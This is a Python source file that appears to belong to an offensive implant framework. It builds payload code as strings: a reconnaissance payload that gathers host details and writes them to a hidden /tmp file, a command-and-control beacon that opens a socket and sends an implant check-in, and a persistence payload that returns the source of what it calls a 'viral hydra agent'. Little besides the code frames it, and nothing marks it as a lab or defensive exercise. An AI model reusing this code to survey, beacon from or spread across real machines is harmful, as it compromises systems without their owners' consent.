import time
import os
import inspect
from . import hydra

def get_recon_payload():
    timestamp = time.time()
    return f"""
import os
import platform
import time
import json
import socket

# TARGET: RECON
# TIMESTAMP: {timestamp}

try:
    data = {{
        'system': platform.uname().system,
        'node': platform.uname().node,
        'release': platform.uname().release,
        'version': platform.uname().version,
        'machine': platform.uname().machine,
        'processor': platform.uname().processor,
        'uid': os.getuid(),
        'cwd': os.getcwd(),
        'hostname': socket.gethostname()
    }}

    # Write to a hidden file
    out_file = f"/tmp/.recon_data_{int(timestamp)}.json"
    with open(out_file, 'w') as f:
        json.dump(data, f, indent=2)
except Exception:
    pass
"""

def get_beacon_payload():
    timestamp = time.time()
    return f"""
import socket
import time

# TARGET: C2 BEACON
# TIMESTAMP: {timestamp}

C2_HOST = '127.0.0.1'
C2_PORT = 10000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect((C2_HOST, C2_PORT))
    s.sendall(b"IMPLANT_CHECKIN:{timestamp}")
    s.close()
except Exception:
    pass
"""

def get_persistence_payload():
    return get_hydra_payload()

def get_hydra_payload():
    # Returns the source code of the viral hydra agent
    try:
        source = inspect.getsource(hydra)
        # Append the execution block if missing (though it is in the file)
        return source
    except Exception:
        return get_recon_payload()
